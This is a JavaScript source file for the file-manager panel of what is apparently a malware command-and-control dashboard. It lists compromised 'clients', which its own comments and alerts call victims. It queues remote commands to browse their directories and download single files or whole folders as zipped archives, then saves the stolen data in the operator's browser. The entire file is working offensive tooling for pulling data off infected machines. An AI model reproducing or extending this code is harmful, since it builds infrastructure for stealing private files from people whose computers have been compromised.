// File Manager Logic
var currentFileClientUid = null;
var currentFilePath = '';

function loadFileClients() {
    $.get('/api/c2/clients', function (data) {
        var list = $('#file-client-list');
        list.empty();

        if (data.clients && data.clients.length > 0) {
            data.clients.forEach(function (client) {
                var activeClass = (currentFileClientUid === client.uid) ? 'bg-blue-600/20 border-blue-500/30' : 'bg-slate-800 border-slate-700 hover:bg-slate-700';
                var statusColor = (client.status === 'online') ? 'text-emerald-400' : 'text-slate-500';

                var item = '<div class="p-3 rounded-lg border ' + activeClass + ' cursor-pointer transition-all" onclick="selectFileClient(\'' + client.uid + '\', \'' + (client.info.user || 'Unknown') + '\')">' +
                    '<div class="flex justify-between items-center mb-1">' +
                    '<span class="font-bold text-slate-200 truncate">' + (client.info.user || 'Unknown') + '</span>' +
                    '<span class="text-xs ' + statusColor + '">●</span>' +
                    '</div>' +
                    '<div class="text-xs text-slate-400 truncate">' + client.uid + '</div>' +
                    '</div>';
                list.append($(item));
            });
        } else {
            list.html('<div class="text-center text-slate-600 py-4 italic">No active sessions</div>');
        }
    });
}

function selectFileClient(uid, user) {
    currentFileClientUid = uid;
    currentFilePath = '';

    // Update UI
    $('#file-current-path').text('Loading...');
    $('#btn-parent-dir').prop('disabled', true);

    loadFileClients(); // Refresh to update active state

    // Request file list from victim
    $.ajax({
        url: '/api/c2/queue_command',
        type: 'POST',
        data: JSON.stringify({ uid: uid, cmd: '__list_files__' }),
        contentType: 'application/json',
        success: function () {
            // Poll for response
            setTimeout(function () { fetchFileList(uid); }, 1500);
        }
    });
}

function fetchFileList(uid) {
    $.get('/api/c2/get_file_list/' + uid, function (data) {
        if (data.files) {
            currentFilePath = data.path || '';
            displayFiles(data.files, data.path);
        } else {
            $('#file-list').html('<div class="text-center text-slate-500 py-20">Waiting for response...</div>');
            // Retry
            setTimeout(function () { fetchFileList(uid); }, 2000);
        }
    });
}

function displayFiles(files, path) {
    $('#file-current-path').text(path || 'Root');
    $('#btn-parent-dir').prop('disabled', !path || path === '');

    var list = $('#file-list');
    list.empty();

    if (!files || files.length === 0) {
        list.html('<div class="text-center text-slate-500 py-20">No files found</div>');
        return;
    }

    var table = $('<table class="w-full text-sm"></table>');
    var thead = $('<thead class="border-b border-slate-800"><tr><th class="text-left py-2 px-3 text-slate-500">Name</th><th class="text-left py-2 px-3 text-slate-500">Type</th><th class="text-right py-2 px-3 text-slate-500">Size</th><th class="text-right py-2 px-3 text-slate-500">Actions</th></tr></thead>');
    var tbody = $('<tbody></tbody>');

    files.forEach(function (file) {
        var icon = file.type === 'dir' ? 'fa-folder text-yellow-500' : 'fa-file text-slate-400';
        var sizeStr = file.type === 'dir' ? '-' : formatBytes(file.size || 0);

        var row = $('<tr class="border-b border-slate-800 hover:bg-slate-800/50 transition-colors"></tr>');

        var nameCell = $('<td class="py-2 px-3"></td>');
        var nameLink = $('<span class="flex items-center space-x-2 cursor-pointer"></span>');
        nameLink.html('<i class="fas ' + icon + '"></i><span class="text-slate-300">' + file.name + '</span>');

        if (file.type === 'dir') {
            nameLink.click(function () {
                navigateToDir(file.name);
            });
        }

        nameCell.append(nameLink);
        row.append(nameCell);

        row.append('<td class="py-2 px-3 text-slate-400">' + file.type.toUpperCase() + '</td>');
        row.append('<td class="py-2 px-3 text-right text-slate-400 font-mono text-xs">' + sizeStr + '</td>');

        var actionCell = $('<td class="py-2 px-3 text-right"></td>');
        if (file.type === 'file') {
            var downloadBtn = $('<button class="px-2 py-1 bg-blue-500/10 text-blue-400 rounded text-xs hover:bg-blue-500/20 border border-blue-500/20"><i class="fas fa-download"></i></button>');
            downloadBtn.click(function () {
                downloadFile(file.name);
            });
            actionCell.append(downloadBtn);
        }
        row.append(actionCell);

        tbody.append(row);
    });

    table.append(thead);
    table.append(tbody);
    list.append(table);
}

function navigateToDir(dirname) {
    if (!currentFileClientUid) return;

    var newPath = currentFilePath ? currentFilePath + '\\' + dirname : dirname;

    $('#file-list').html('<div class="text-center text-slate-500 py-20"><i class="fas fa-spinner fa-spin mr-2"></i>Loading...</div>');

    $.ajax({
        url: '/api/c2/queue_command',
        type: 'POST',
        data: JSON.stringify({ uid: currentFileClientUid, cmd: '__list_files__ ' + newPath }),
        contentType: 'application/json',
        success: function () {
            setTimeout(function () { fetchFileList(currentFileClientUid); }, 1500);
        }
    });
}

function downloadFile(filename) {
    if (!currentFileClientUid) return;

    var fullPath = currentFilePath ? currentFilePath + '\\' + filename : filename;

    // Queue download command
    $.ajax({
        url: '/api/c2/queue_command',
        type: 'POST',
        data: JSON.stringify({ uid: currentFileClientUid, cmd: '__download__ ' + fullPath }),
        contentType: 'application/json',
        success: function () {
            GrowlNotification.notify({
                title: 'Download Queued',
                description: 'Requesting file: ' + filename,
                type: 'success',
                position: 'top-right'
            });

            // Poll for file data
            setTimeout(function () { checkDownloadReady(currentFileClientUid, filename); }, 2000);
        }
    });
}

function checkDownloadReady(uid, filename) {
    $.get('/api/c2/get_download/' + uid, function (data) {
        if (data.file) {
            // Trigger browser download
            var link = document.createElement('a');
            link.href = 'data:application/octet-stream;base64,' + data.file.content;
            link.download = filename;
            link.click();

            GrowlNotification.notify({
                title: 'Download Complete',
                description: filename + ' downloaded successfully',
                type: 'success',
                position: 'top-right'
            });
        } else {
            // Retry
            setTimeout(function () { checkDownloadReady(uid, filename); }, 2000);
        }
    });
}

function downloadAllFiles() {
    if (!currentFileClientUid) {
        alert('Please select a victim first');
        return;
    }

    // Queue command to zip all files in current directory
    $.ajax({
        url: '/api/c2/queue_command',
        type: 'POST',
        data: JSON.stringify({ uid: currentFileClientUid, cmd: '__download_all__ ' + currentFilePath }),
        contentType: 'application/json',
        success: function () {
            GrowlNotification.notify({
                title: 'Bulk Download Started',
                description: 'Creating archive of all files...',
                type: 'info',
                position: 'top-right'
            });

            setTimeout(function () { checkDownloadReady(currentFileClientUid, 'archive.zip'); }, 5000);
        }
    });
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    var k = 1024;
    var sizes = ['B', 'KB', 'MB', 'GB'];
    var i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function initFileManager() {
    $('#btn-refresh-files').click(loadFileClients);
    $('#btn-download-all-files').click(downloadAllFiles);

    $('#btn-parent-dir').click(function () {
        if (!currentFilePath) return;

        var parts = currentFilePath.split('\\');
        parts.pop();
        var parentPath = parts.join('\\');

        $.ajax({
            url: '/api/c2/queue_command',
            type: 'POST',
            data: JSON.stringify({ uid: currentFileClientUid, cmd: '__list_files__ ' + parentPath }),
            contentType: 'application/json',
            success: function () {
                setTimeout(function () { fetchFileList(currentFileClientUid); }, 1500);
            }
        });
    });

    // Periodically refresh client list
    setInterval(loadFileClients, 5000);
}

// Make functions global for onclick
window.selectFileClient = selectFileClient;

// Initialize on load
window.addEventListener('load', function () {
    initFileManager();
});
